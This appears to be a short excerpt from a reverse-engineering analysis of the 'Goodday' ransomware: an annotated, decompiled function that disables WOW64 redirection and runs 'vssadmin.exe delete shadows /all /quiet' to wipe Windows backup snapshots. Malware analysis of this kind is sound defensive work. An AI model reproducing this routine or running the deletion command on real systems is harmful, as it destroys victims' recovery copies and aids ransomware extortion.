////////////////////////////////////////////////////////////
// Goodday Ransomware
// https://www.shadowstackre.com/analysis/Goodday
//
// Analysis: ShadowStackRE
////////////////////////////////////////////////////////////
FARPROC DeleteShadowCopy()
{
  FARPROC result; // eax
  HMODULE LibraryA; // [esp+0h] [ebp-14h]
  HMODULE hModule; // [esp+4h] [ebp-10h]
  int v3; // [esp+Ch] [ebp-8h] BYREF
  BOOL (__stdcall *Wow64DisableWow64FsRedirection)(PVOID *); // [esp+10h] [ebp-4h]

  v3 = 0;
  if ( IsWOW64Proc() )                          // IsWow64Process
  {
    hModule = LoadLibraryA(libKernel32dll);
    // Disable WOW64 redirection, so the 32bit code has access to system32 directory natively
    Wow64DisableWow64FsRedirection = (BOOL (__stdcall *)(PVOID *))GetProcAddress(hModule, aWow64disablewo);
    if ( Wow64DisableWow64FsRedirection )
      Wow64DisableWow64FsRedirection((PVOID *)&v3);
  }
  ShellExecuteW(0, OpenOper, cmdExe, vssadminCmd, 0, 0);// Delete ShadowCopy (/c vssadmin.exe delete shadows /all /quiet)
  result = (FARPROC)IsWOW64Proc();
  if ( result )
  {
    LibraryA = LoadLibraryA(aKernel32Dll_2);
    result = GetProcAddress(LibraryA, aWow64revertwow);
    if ( result )
      return (FARPROC)((int (__stdcall *)(int))result)(v3);
  }
  return result;
}